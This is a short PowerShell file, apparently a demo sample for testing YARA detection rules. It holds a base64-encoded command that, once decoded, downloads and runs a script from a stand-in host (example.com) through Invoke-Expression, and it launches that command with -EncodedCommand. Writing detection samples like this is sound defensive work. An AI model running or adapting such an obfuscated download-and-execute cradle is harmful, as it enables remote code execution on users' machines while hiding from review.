# Simulated suspicious PowerShell (for demo purposes only)
# This is NOT real malware - just strings for YARA demo
$encoded = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AcABhAHkAbABvAGEAZAAnACkA"
powershell -EncodedCommand $encoded
# IEX (Invoke-Expression) pattern
